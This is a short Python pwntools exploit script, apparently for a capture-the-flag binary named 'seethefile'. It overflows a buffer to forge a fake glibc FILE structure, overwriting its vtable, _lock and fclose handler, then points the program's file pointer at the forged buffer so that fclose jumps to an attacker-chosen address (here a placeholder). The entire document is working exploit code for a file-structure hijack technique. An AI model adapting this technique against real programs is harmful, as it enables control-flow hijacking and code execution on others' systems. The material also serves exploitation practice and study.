from pwn import *

seethefile = ELF('seethefile')
libc = ELF('libc_32.so.6')


LOCK_OFFSET = 0x88
VTABLE_OFFSET = 0x90
VTABLE_FCLOSE_OFFSET = 0x44

MAGICBUF_ADDR = 0x0804B0C0
FP_ADDR = 0x0804B280
SHELLCODE_ADDR = 0xaabbccdd
NAME_ADDR = 0x0804B260


p = gdb.debug(
    seethefile.path,
    '''
    b fclose
    c
    ''',
    env=dict(LD_PRELOAD=libc.path)
)

p.sendline('1')
p.sendline('/proc/self/fd/0')
p.sendline('2')

payload = b''

# Override `fclose` handler.
payload += b'A' * VTABLE_FCLOSE_OFFSET + p32(SHELLCODE_ADDR)

# Override `_lock`.
payload += b'A' * (LOCK_OFFSET - VTABLE_FCLOSE_OFFSET - 4) + p32(NAME_ADDR)

# Override `vtable` member of the `FILE` struct.
payload += b'A' * (VTABLE_OFFSET - LOCK_OFFSET - 4) + p32(MAGICBUF_ADDR)

# Fill buffer
payload += b'A' * 500

p.sendline(payload)

p.sendline('5')
# Set `fp` to `magicbuf`
p.sendline(b'A' * 0x20 + p32(MAGICBUF_ADDR))
